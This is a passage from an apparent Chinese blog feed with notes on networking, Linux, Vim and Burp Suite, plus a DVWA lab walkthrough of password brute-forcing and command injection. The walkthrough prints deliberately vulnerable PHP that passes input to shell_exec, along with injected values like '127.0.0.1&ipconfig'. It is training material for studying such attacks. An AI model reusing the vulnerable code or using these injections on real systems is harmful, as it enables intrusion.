href="mailto:root@192.168.1.128">root@192.168.1.128</a>:/home/duyada/scp/</p><p>//上传到目标机</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络基础笔记</title>
      <link href="/2020/04/19/network/"/>
      <url>/2020/04/19/network/</url>
      
        <content type="html"><![CDATA[<p>在一个风和日丽的下午，看了一篇关于计算机网络的文章，发现自己有些东西也忘的差不多了，就想着顺便复习一下网络基础知识，并记录一下今天做了什么。</p><blockquote><p>保持清醒的头脑，知道自己在做什么，知道自己做过什么。</p></blockquote><p>我这个人还是比较健忘的，有时候两秒前刚做的事转头就忘的一干二净，想起来还挺费劲。于是为了避免自己到时候脑子一片空白的情况，还是把今天干的事情记录一下为好。</p><h2 id="计算机网络基础笔记"><a href="#计算机网络基础笔记" class="headerlink" title="计算机网络基础笔记"></a>计算机网络基础笔记</h2><h3 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h3><p>自下而上依次为：物理层、数据链路层，网络层、传输层、会话层、表示层、应用层。        </p><table><thead><tr><th>七层模型</th><th>简易理解</th><th>设备</th></tr></thead><tbody><tr><td>物理层</td><td>有物理设备</td><td>中继器、集线器</td></tr><tr><td>数据链路层</td><td>存在链路</td><td>网桥、交换机 (帧)</td></tr><tr><td>网络层</td><td>地图寻址</td><td>路由器 (IP数据报)</td></tr><tr><td>传输层</td><td>提供可靠的传输</td><td>网关 （TCP、UDP）</td></tr><tr><td>会话层</td><td>建立连接</td><td></td></tr><tr><td>表示层</td><td>数据转化</td><td></td></tr><tr><td>应用层</td><td>应用间协议</td><td></td></tr></tbody></table><h3 id="私有IP地址"><a href="#私有IP地址" class="headerlink" title="私有IP地址"></a>私有IP地址</h3><p>私有地址(private address)也叫专用地址，它们不会在全球使用，只具有本地意义。</p><ul><li>A类私有地址：10.0.0.0/8，范围是：10.0.0.0~10.255.255.255</li><li>B类私有地址：172.16.0.0/12，范围是：172.16.0.0~172.31.255.255</li><li>C类私有地址：192.168.0.0/16，范围是：192.168.0.0~192.168.255.255</li></ul><p>子网掩码简单来说就是划分子网用的。</p><ul><li>如果两个IP地址在子网掩码的按位与的计算下所得结果相同，即表明它们共属于同一子网中。</li></ul><blockquote><p>比如一个子网有10台主机，那么对于这个子网需要的IP地址是：</p><p>　　10＋1＋1＋1＝13</p><p>　　<strong>注意：加的第一个**</strong>1<strong><strong>是指这个网络连接时所需的网关地址，接着的两个</strong></strong>1<strong>**分别是指网络地址和广播地址。</strong></p><p>　　因为13小于16（16等于2的4次方），所以主机位为4位。而256－16＝240，所以该子网掩码为255.255.255.240。</p><p>如果一个子网有14台主机，不少人常犯的错误是：依然分配具有16个地址空间的子网，而忘记了给网关分配地址。这样就错误了，因为14＋1＋1＋1＝17，17大于16，所以我们只能分配具有32个地址（32等于2的5次方）空间的子网。这时子网掩码为：255.255.255.224。</p></blockquote><h3 id="ARP-RARP协议"><a href="#ARP-RARP协议" class="headerlink" title="ARP/RARP协议"></a>ARP/RARP协议</h3><p>ARP：地址解析协议（address resolution protocol）是通过IP地址获取到MAC地址。</p><p>RARP：逆地址解析协议，将MAC地址转换为IP地址。</p><h3 id="路由选择协议"><a href="#路由选择协议" class="headerlink" title="路由选择协议"></a>路由选择协议</h3><p>RIP协议：最大跳数为15跳，超过15跳会丢弃数据包。</p><p>OSPF协议：开放式最短路径优先，是链路状态路由选择协议。</p><h3 id="TCP-IP协议"><a href="#TCP-IP协议" class="headerlink" title="TCP/IP协议"></a>TCP/IP协议</h3><p>TCP/IP协议毫无疑问是互联网的基础协议，没有它就根本不可能上网，任何和互联网有关的操作都离不开TCP/IP协议。</p><p>IP层接收更底层发来的数据包，并将该数据包传送到更低层。IP数据包是不可靠的传输。</p><p>TCP是面向连接的通信协议，三次握手建立可靠的连接。</p><blockquote><p>使用TCP的协议：FTP（文件传输协议）、Telnet（远程登录协议）、SMTP（简单邮件传输协议）、POP3（和SMTP相对，用于接收邮件）、HTTP协议等。</p></blockquote><p>UDP是面向无连接的通讯协议，UDP数据包包括源端口号和目的端口号。属于不可靠的传输。</p><blockquote><p>使用UDP协议包括：TFTP（简单文件传输协议）、SNMP（简单网络管理协议）、DNS（域名解析协议）、NFS、BOOTP。</p></blockquote><p>DNS域名解析服务，将URL转换为IP地址。</p><p>NAT网络地址转换，将私有地址转化为合法IP的技术。</p><h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><p>服务器在网络上为不同用户提供不同内容的信息、资料和文件。可以说服务器就是Internet网络上的资源仓库。</p><h3 id="服务器种类"><a href="#服务器种类" class="headerlink" title="服务器种类"></a>服务器种类</h3><ol><li><p>www服务器</p><p>WWW服务器能够为用户提供网页浏览、论坛访问等等服务。</p></li><li><p>FTP服务器</p><p>FTP服务器是专门为用户提供各种文件(File)的服务器。</p></li><li><p>邮件服务器</p><p>邮件服务器就像邮局一样，可以为用户提供电子邮件的接收存储和发送服务。 </p></li></ol><p>除了以上3种常见的服务器外，还有数据库服务器、代理服务器、域名服务器等。</p><h3 id="RAID技术"><a href="#RAID技术" class="headerlink" title="RAID技术"></a>RAID技术</h3><p>在部署服务器之前，一般要做RAID。</p><ul><li>RAID：（Redundant Array of Inexpensive Disk）廉价冗余磁盘阵列。由于磁盘存取速度跟不上CPU处理速度的发展，从而成为提高服务器I/O能力的一个瓶颈。RAID技术利用磁盘分段、磁盘镜像、数据冗余技术来提高磁盘存取速度，同时提供磁盘数据备份、提高了系统可靠性。</li><li>磁盘分段（Disk Striping）：数据以”段”为单位依次读写多个磁盘，多磁盘相当于同时操作，存取速度极大地提高。</li><li>磁盘镜像（Disk Mirroring）：用一个控制器控制两个磁盘，同时读写相同的数据，数据100%备份。 </li><li>数据冗余技术：数据读写时做校验，校验数据以紧凑格式存于磁盘上，可用于纠错及恢复数据。 </li></ul><p>RAID级别</p><table><thead><tr><th>RAID级别</th><th>描述</th><th>技术</th><th>速度</th><th>容错能力</th></tr></thead><tbody><tr><td>RAID 0</td><td>磁盘分段</td><td>没有校验数据</td><td>磁盘并行I/O，存取速度提高最大</td><td>数据无备份</td></tr><tr><td>RAID 1</td><td>磁盘镜像</td><td>没有校验数据</td><td>读数据速度有提高</td><td>数据100%备份(浪费)</td></tr><tr><td>RAID 2</td><td>磁盘分段+汉明码数据纠错</td><td>/</td><td>没有提高</td><td>允许单个磁盘错</td></tr><tr><td>RAID 3</td><td>磁盘分段+奇偶校验</td><td>专用校验数据盘</td><td>磁盘并行I/O，速度提高较大</td><td>允许单个磁盘错，校验盘除外</td></tr><tr><td>RAID 4</td><td>磁盘分段+奇偶校验</td><td>异步专用校验数据盘</td><td>磁盘并行I/O，速度提高较大</td><td>允许单个磁盘错，校验盘除外</td></tr><tr><td>RAID 5</td><td>磁盘分段+奇偶校验</td><td>校验数据分布存放于多盘</td><td>磁盘并行I/O，速度提高较大，比RAID 0稍慢</td><td>允许单个磁盘错，无论哪个盘</td></tr></tbody></table><p>磁盘系统作好RAID 5后，任一块磁盘出现故障后，系统仍可运行，故障盘上的数据可通过其它盘上的校验数据计算出来（此时速度要慢一些）。如果磁盘系统中有备份盘，则数据自动恢复到备份盘中。如果具备热插拔硬盘，则在开机状态下即可换下故障硬盘，数据将自动恢复到新硬盘上。在这些过程中，系统并没有停止运行。</p><h2 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h2><h3 id="报文"><a href="#报文" class="headerlink" title="报文"></a>报文</h3><p>HTTP1.0/1.1报文由三部分组成：起始行、首部以及可选、包含数据的主体</p><p><strong>其中起始行和首部是由行分隔的ASCII文本</strong></p><p>请求报文的格式：</p><pre><code>&lt;method&gt; &lt;request-url&gt; &lt;version&gt;&lt;headers&gt;&lt;entity-body&gt;</code></pre><p>响应报文的格式：</p><pre><code>&lt;version&gt; &lt;status&gt; &lt;reason-phrase&gt;&lt;headers&gt;&lt;entity-body&gt;</code></pre><h4 id="起始行"><a href="#起始行" class="headerlink" title="起始行"></a>起始行</h4><p>所有的HTTP报文都以一个起始行做为开始</p><p>请求报文：<method> <request-url> <version>   说明要做什么</p><p>响应报文：<version> <status> <reason-phrase>  说明结果怎样</p><p>method，包括GET/POST/DELETE等等</p><p>version，目前绝大多数都是1.0或者1.1</p><p>status，表示做的结果</p><p>reason-phrase，是对状态结果的进一步补充说明</p><h4 id="首部"><a href="#首部" class="headerlink" title="首部"></a>首部</h4><p>HTTP首部字段向请求和响应报文中添加了一些附加信息，是一系列 key-value的列表,比如Content-Type:image/jpeg 表示类型是jpeg图片</p><p>首部的分类包括</p><p>通用首部：在请求和响应中都出现的信息</p><p>请求首部：只在请求报文中出现的信息</p><p>响应首部：只在响应报文中出现的信息</p><p>实体首部：描述主题的长度、内容等的信息</p><p>扩展首部：在HTTP规范中没有定义的其他信息</p><h4 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h4><p>HTTP实体是HTTP报文的负荷，是HTTP要传输的数据内容。</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>GET，请求服务器发送某个资源</p><p>POST，向服务器提交数据，有主体。</p><p>HEAD，响应只在首部，不返回具体数据，查看资源是否存在。</p><hr><p>PUT:用于向服务端写入文档</p><p>TRACE:用于跟踪某个请求</p><p>OPTIONS:用于查询服务端支持的方法</p><p>DELETE:用于删除服务端某个资源</p><hr><p>LOCK：锁定某个资源</p><p>COPY：拷贝某个资源</p><p>MOVE：移动某个资源</p><h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><p>信息性状态码：100~199</p><p>成功状态码：200~299</p><p>重定向状态码：300~399</p><p>客户端错误状态码：400~499</p><p>服务端错误状态码：500~599</p><h2 id="计算机端口"><a href="#计算机端口" class="headerlink" title="计算机端口"></a>计算机端口</h2><p>在Internet上，按照协议类型分类，端口被分为TCP端口和UDP端口两类，虽然他们都用正整数标识，但这并不会引起歧义，比如TCP的80端口和UDP的80端口，因为数据报在标明端口的同时，还将标明端口的类型。<br>　　从端口的分配来看，端口被分为固定端口和动态端口两大类（一些教程还将极少被用到的高端口划分为第三类：私有端口）：</p><p>固定端口（0－1023）：</p><p>使用集中式管理机制，即服从一个管理机构对端口的指派，这个机构负责发布这些指派。由于这些端口紧绑于一些服务，所以我们会经常扫描这些端口来判断对方 是否开启了这些服务，如TCP的21（ftp），80（http），139（netbios），UDP的7（echo），69（tftp）等等一些大家熟 知的端口；</p><p>动态端口（1024－49151）：</p><p>这些端口并不被固定的捆绑于某一服务，操作系统将这些端口动态的分配给各个进程， 同一进程两次分配有可能分配到不同的端口。不过一些应用程序并不愿意使用操作系统分配的动态端口，他们有其自己的‘商标性’端口，如oicq客户端的 4000端口，木马冰河的7626端口等都是固定而出名的。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何学习Linux系统_笔记</title>
      <link href="/2020/04/11/linux-2/"/>
      <url>/2020/04/11/linux-2/</url>
      
        <content type="html"><![CDATA[<p>网上冲浪过程中看到这样一篇文章，觉得有些地方写的挺不错，摘抄过来，留一些我觉得比较有用的东西。这就是一篇关于linux系统的科普文。</p><h2 id="如何学习Linux系统-笔记"><a href="#如何学习Linux系统-笔记" class="headerlink" title="如何学习Linux系统_笔记"></a>如何学习Linux系统_笔记</h2><h3 id="1、Linux初学者入门首选-Redhat系列"><a href="#1、Linux初学者入门首选-Redhat系列" class="headerlink" title="1、Linux初学者入门首选-Redhat系列"></a>1、Linux初学者入门首选-Redhat系列</h3><p>Redhat 是最早发行的个人版Linux。学会Redhat Linux，其他的Linux系统也能很快的学会。</p><p>Redhat 现在主要做服务器版的Linux开发。不再提供免费版本。Redhat应用范围较广，很多Linux系统都是以Redhat系统为基准的。</p><p>Centos 是Redhat的复刻版，提供免费的服务，但也不和Redhat系统完全一样。</p><p>suse Linux 是企业级应用首选系统，具有高可靠性和稳定性。</p><p>Ubuntu 游戏娱乐首选，Ubuntu主打Linux桌面。对硬件支持最好也最全面。</p><h3 id="2、良好的Linux操作习惯"><a href="#2、良好的Linux操作习惯" class="headerlink" title="2、良好的Linux操作习惯"></a>2、良好的Linux操作习惯</h3><p>命令是学习Linux的基础，要学会Linux每个命令的参数含义是必须要做的。看起来容易理解，但要是实际操作，很难去熟练的使用。勤于实践是学好Linux的根本。</p><h4 id="学会独立思考问题，独立解决问题"><a href="#学会独立思考问题，独立解决问题" class="headerlink" title="学会独立思考问题，独立解决问题"></a>学会独立思考问题，独立解决问题</h4><blockquote><p>遇到问题，首先想到的应该是如何自己去解决这个问题，解决方式很多，看书查资料，网络搜索引擎，技术论坛等等，通过这几种方式，90%的问题都能得到解决，通过这种方式一方面锻炼了自己独立解决问题的能力。另一方面技术上也能得到快速提高。<br>如果通过如上方式实在解决不了的话，可以向人询问，得到答案后要考虑为何这么做，然后做笔记记录解决过程。最忌讳的方式是只要遇到问题，就去问人，虽然这样可能会很快解决问题，但是长久下去遇到问题就会依赖别人，技术上也不会进步。</p></blockquote><p>要有主动性的思考，不知道如何实现的，就要去了解他的工作原理。然后根据自己的逻辑来解决遇到的难题。这是我们应该做到的。</p><p>最重要的是自己要能解决问题，而不是依赖别人。</p><h4 id="尝试去看英文文档"><a href="#尝试去看英文文档" class="headerlink" title="尝试去看英文文档"></a>尝试去看英文文档</h4><p>安装一个新的软件时先看README，再看INSTALL，然后看FAQ，最后才动手安装，这样遇到问题就知道为什么。因此，学习一点专业的英语是很有必要的。</p><h4 id="Linux学习路线图"><a href="#Linux学习路线图" class="headerlink" title="Linux学习路线图"></a>Linux学习路线图</h4><p>初级阶段：</p><ol><li>命令是必须要学的，linux常用的命令大概在80个左右，这些常用命令一定要熟练掌握。</li><li>掌握linux软件包的常用安装方法，例如源码安装，rpm方式安装等等。</li><li>学习安装设备驱动程序（比如网卡、显卡驱动） </li><li>熟悉Grub/Lilo引导程序及简单的修复操作。 </li><li>熟悉Linux文件系统和目录结构以及linux基本运行原理。 </li><li>掌握vi，gcc，gdb等常用编辑器，编译器，调试器。 </li><li>理解shell别名、管道、I/O重定向、输入和输出以及shell简单脚本编程。 </li><li>学习Linux环境下的网络基本组建。</li></ol><p>高级阶段:</p><ol><li><p>尝试阅读linux内核源码：</p><p>这需要具有一定的C、C++语言基础，因为C、C++是linux/unix的核心语言，系统代码都是C写的。</p></li><li><p>尝试编译安装和调试自己的linux内核：<br>在阅读源码了解了linux底层的运行原理后，完全可以编译一个适合自己的linux系统来。</p></li><li><p>深入学习shell， perl，cgi等脚本语言：<br>这些脚本语言在linux下非常强大，它们能完成你想做的任何事情，熟练掌握这些语言，可以让你在linux系统下游刃有余，如鱼得水。</p></li><li><p>构建企业级linux高可用集群系统：<br>linux下有很多开源免费的集群软件，利用这些免费的集群软件完全可以构建出与商业unix系统想媲美的集群系统来。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vim练级攻略记录</title>
      <link href="/2020/03/09/Vim/"/>
      <url>/2020/03/09/Vim/</url>
      
        <content type="html"><![CDATA[<p>一直想着自己能熟练的使用vim，有时候命令忘记了又要去百度，于是找了一篇详细介绍vim的文档，并进行了总结（把一些我觉得有用的记录下来）。</p><h2 id="Vim攻略"><a href="#Vim攻略" class="headerlink" title="Vim攻略"></a>Vim攻略</h2><h3 id="第一级-基础"><a href="#第一级-基础" class="headerlink" title="第一级 - 基础"></a>第一级 - 基础</h3><h4 id="普通模式"><a href="#普通模式" class="headerlink" title="普通模式"></a>普通模式</h4><ul><li><code>i</code> → <em>Insert</em> 模式，按 <code>ESC</code> 回到 <em>Normal</em> 模式.</li><li><code>x</code> → 删当前光标所在的一个字符。</li><li><code>:wq</code> → 保存 + 退出 (<code>:w</code> 存盘, <code>:q</code> 退出)</li><li><code>dd</code> → 删除当前行，并把删除的行存到剪贴板里</li><li><code>p</code> → 粘贴剪贴板</li><li><code>: N</code> 到第N行</li></ul><h3 id="第二级-感觉良好"><a href="#第二级-感觉良好" class="headerlink" title="第二级 - 感觉良好"></a>第二级 - 感觉良好</h3><h4 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h4><ul><li><code>a</code> → 在光标后插入</li><li><code>o</code> → 在当前行后插入一个新行</li><li><code>O</code> → 在当前行前插入一个新行</li><li><code>cw</code> → 替换从光标所在位置后到一个单词结尾的字符</li></ul><h4 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h4><ul><li><code>0</code> → 数字零，到行头</li><li><code>$</code> → 到本行行尾</li></ul><h4 id="复制粘贴"><a href="#复制粘贴" class="headerlink" title="复制粘贴"></a>复制粘贴</h4><ul><li><code>P</code> → 粘贴</li><li><code>yy</code> → 拷贝当前行当行于 <code>ddP</code></li></ul><h4 id="保存文件"><a href="#保存文件" class="headerlink" title="保存文件"></a>保存文件</h4><ul><li><code>:x</code>， <code>ZZ</code> 或 <code>:wq</code> → 保存并退出 (<code>:x</code> 表示仅在需要时保存，ZZ不需要输入冒号并回车)</li><li><code>:q!</code> → 退出不保存 <code>:qa!</code> 强行退出所有的正在编辑的文件，就算别的文件有更改。</li><li><code>:bn</code> 和 <code>:bp</code> → 你可以同时打开很多文件，使用这两个命令来切换下一个或上一个文件。</li></ul><h3 id="第三级-更好，更强，更快"><a href="#第三级-更好，更强，更快" class="headerlink" title="第三级-更好，更强，更快"></a>第三级-更好，更强，更快</h3><h4 id="更好"><a href="#更好" class="headerlink" title="更好"></a>更好</h4><ul><li><code>.</code> → (小数点) 可以重复上一次的命令</li><li>N<command> → 重复某个命令N次</li><li><code>2dd</code>→删除2行</li><li><code>3p</code>→粘贴文本3次</li></ul><h4 id="更强"><a href="#更强" class="headerlink" title="更强"></a>更强</h4><ul><li>N<code>G</code> → 到第 N 行 （陈皓注：注意命令中的G是大写的，另我一般使用 : N 到第N行，如 :137 到第137行）</li><li><code>gg</code> → 到第一行。（陈皓注：相当于1G，或 :1）</li><li><code>G</code> → 到最后一行。</li><li>按单词移动<ul><li><code>w</code>→到下一个单词的开头</li><li><code>e</code>→到下一个单词的结尾</li></ul></li></ul><pre><code>&gt; 如果你认为单词是由默认方式，那么就用小写的e和w。默认上来说，一个单词由字母，数字和下划线组成（陈皓注：程序变量）&gt; 如果你认为单词是由blank字符分隔符，那么你需要使用大写的E和W。（陈皓注：程序语句）</code></pre><ul><li><code>%</code> : 匹配括号移动，包括 <code>(</code>, <code>{</code>, <code>[</code>. （陈皓注：你需要把光标先移到括号上）</li><li><code>*</code> 和 <code>#</code>:  匹配光标当前所在的单词，移动光标到下一个（或上一个）匹配单词（*是下一个，#是上一个）</li></ul><h4 id="更快"><a href="#更快" class="headerlink" title="更快"></a>更快</h4><ul><li>例如 <code>0y$</code> 命令意味着：<ul><li><code>0</code> → 先到行头</li><li><code>y</code> → 从这里开始拷贝</li><li><code>$</code> → 拷贝到本行最后一个字符</li></ul></li><li>还有很多时间并不一定你就一定要按y才会拷贝，下面的命令也会被拷贝：<ul><li><code>d</code> (删除 )</li><li><code>v</code> (可视化的选择)</li><li><code>gU</code> (变大写)</li><li><code>gu</code> (变小写)</li></ul></li></ul><h3 id="第四级-Vim超能力"><a href="#第四级-Vim超能力" class="headerlink" title="第四级 - Vim超能力"></a>第四级 - Vim超能力</h3><ul><li><code>:split</code> → 创建分屏 (<code>:vsplit</code>创建垂直分屏)</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp Suite使用记录</title>
      <link href="/2020/03/08/Burp-Suite/"/>
      <url>/2020/03/08/Burp-Suite/</url>
      
        <content type="html"><![CDATA[<p>之前学bp，学到了一点皮毛，知道怎么来爆破密码，但是对具体的操作没有进行实验，这几天闲了，再重新把爆破这部分做了一遍。ヾ(•ω•`)o</p><h2 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h2><h3 id="Intruder-暴力破解模块"><a href="#Intruder-暴力破解模块" class="headerlink" title="Intruder_暴力破解模块"></a>Intruder_暴力破解模块</h3><p>抓到数据包之后，发送到Intruder。</p><p><img src="http://ww1.sinaimg.cn/large/006sKd2tly1gdqc7x6sukj30yy0c3myo.jpg" alt="发送到爆破模块"></p><p>设置攻击目标和目标端口</p><p><img src="http://ww1.sinaimg.cn/large/006sKd2tly1gdqcc9oon9j30yz09edga.jpg" alt="设置攻击目标.png"></p><p>设置变量和攻击模式。</p><p><img src="http://ww1.sinaimg.cn/large/006sKd2tly1gdqcalndr0j30yy0igq4d.jpg" alt="攻击类型"></p><h4 id="attack-type-攻击类型介绍"><a href="#attack-type-攻击类型介绍" class="headerlink" title="attack type 攻击类型介绍"></a>attack type 攻击类型介绍</h4><ul><li><p><strong>Sniper - 单个变量使用一个字典的情况。从上到下，单个匹配。</strong>这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p></li><li><p><strong>Battering ram – 多个变量使用同一个字典的情况。A变量=B变量，每次两个位置用同样的密码。</strong>这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中。</p></li><li><p><strong>Pitchfork - 多个变量使用不同字典的情况。A字典的第一行对应B字典的第一行</strong>这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p></li><li><p><strong>Cluster bomb – 交叉爆破，每一种组合都会测试。多变量建议使用这个模式</strong>这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p></li></ul><h4 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h4><p><img src="http://ww1.sinaimg.cn/large/006sKd2tly1gdqcalndr0j30yy0igq4d.jpg" alt="1583647566242.png"></p><p>Burp Intruder包含以下几种attack type:</p><blockquote><p>Simple list–简单字典<br>Runtime file–运行文件<br>Custom iterator–自定义迭代器<br>Character substitution–字符替换</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Burp Suite </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Burp Suite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-渗透测试入门</title>
      <link href="/2020/03/05/DVWA-1/"/>
      <url>/2020/03/05/DVWA-1/</url>
      
        <content type="html"><![CDATA[<p>dvwa是web渗透测试入门训练平台，了解基础的web安全知识，通过搭建这个平台并学习利用平台上的漏洞来提高自己的能力。</p><h2 id="DVWA-渗透测试入门"><a href="#DVWA-渗透测试入门" class="headerlink" title="DVWA-渗透测试入门"></a>DVWA-渗透测试入门</h2><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>暴力破解即用暴力穷举的方式大量尝试性地猜破密码。</p><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>刚开始看到这个题目不知如何下手。只知道要使用暴力破解，我手头也没有字典。然后就从网上随便找了一个字典进行测试。</p><p>首先打开burpsuite抓包。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegkp6cjvqj30ne07haa4.jpg"/><p>抓到数据包。send to intruder，我第一次做时，是使用sniper模式进行爆破的。用户名随便输了个admin，只设置了密码变量。成功爆出密码后，又使用cluster bomb模式进行了多变量交叉爆破。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegkq3lge8j30o10c6jsl.jpg"/><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjrsh33gj30z10dz0ub.jpg"/><p>成功爆破到用户名和密码。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjszl523j30n80i4gn9.jpg"/><p>暴力破解成功</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegju8ma2kj30nj09a3yo.jpg"/><h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><p>仍然可以爆破成功。爆破时间长了一点。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjupv6b0j30n30i3404.jpg"/><p>查看源代码，发现有sleep(2)的函数。登陆失败会等待2秒。</p><h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>还用之前的方法进行尝试，发现除了第一个包返回正常，其他的都显示302。看来之前的方法行不通了。</p><p>看看源代码。好像多加了一个参数，没思路。看看别人怎么搞的。</p><p>有token验证。抓包使用pitchfork模式。添加爆破的参数。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjv4tbaij30yp0dxgn8.jpg"/><p>对攻击的模块做一些配置，线程设为1个线程。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjvh80z7j30yu0gb75a.jpg"/><p>允许重定向。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjvu60cnj30hr05wjrh.jpg"/><p>在Option中Grep-Extract模块，添加筛选条件，获得user_token。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjwi50ejj30ss0pewhr.jpg"/><p>为了能够成功破解，把字典缩小了一下，并将其正确的账号和密码对应起来，才成功爆破。要是不知道账号密码，爆破起来还是很困难的。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjwv4mgej30ud0i076a.jpg"/><p>我觉得这样pitchfork爆破有点鸡肋，必须账号字典和密码字典刚好一一对应起来才能爆破成功。总之爆破成功不太容易。</p><p>使用交叉爆破模式，三个参数又比较费时间。太难了。</p><h4 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h4><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjx4caapj30no0asdgd.jpg"/><p>输错一次就要等15分钟，GG。暴力破解基本没得搞。</p><h3 id="DVWA命令执行漏洞"><a href="#DVWA命令执行漏洞" class="headerlink" title="DVWA命令执行漏洞"></a>DVWA命令执行漏洞</h3><h4 id="什么是命令执行漏洞"><a href="#什么是命令执行漏洞" class="headerlink" title="什么是命令执行漏洞"></a>什么是命令执行漏洞</h4><p>命令执行漏洞的原理：在操作系统中，&amp;、&amp;&amp;、|、||都可以作为命令连接符使用，用户通过客户端提交执行命令，服务器端未做过滤，导致命令执行成功的过程。</p><h4 id="amp-、-amp-amp-、-、-命令拼接符的区别"><a href="#amp-、-amp-amp-、-、-命令拼接符的区别" class="headerlink" title="&amp;、&amp;&amp;、|、||命令拼接符的区别"></a>&amp;、&amp;&amp;、|、||命令拼接符的区别</h4><p>A&amp;B           简单的拼接，AB间无制约关系</p><p>A&amp;&amp;B        A执行成功，然后再执行B</p><p>A|B            A的输出，作为B的输入</p><p>A||B          A执行失败，然后再执行B  </p><hr><h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><p>查看一下源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) {    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    }    else {        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    }    // Feedback for the end user    $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p>输入一个IP试一下。<code>127.0.0.1</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjxk3zogj30v30dimza.jpg"/><p>返回正常，尝试添加其他命令。<code>127.0.0.1&amp;ipconfig</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjy7euevj30uv0odjvo.jpg"/><p>&amp;两边的命令都被成功执行。<code>127.0.0.1&amp;&amp;ipconfig</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjygltrbj30uv0oy42u.jpg"/><p>&amp;&amp;两边的命令都被成功执行。<code>127.0.0.1|ipconfig</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjyq07zrj30v20nzq6g.jpg"/><p>经过验证表明，<code>|</code>前面的命令不会被执行。只执行后面的命令。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjyzbmyaj30ne08tt96.jpg"/><p>使用<code>||</code>命令试一下，<code>127.0.0.1||ipconfig</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjz9feeoj30v10kh0vz.jpg"/><p>发现<code>||</code>前的命令必须是错误的才能执行<code>||</code>后的命令。否则只执行<code>||</code>前的命令。</p><h4 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h4><p>首先，查看源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) {    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    // Set blacklist    $substitutions = array(        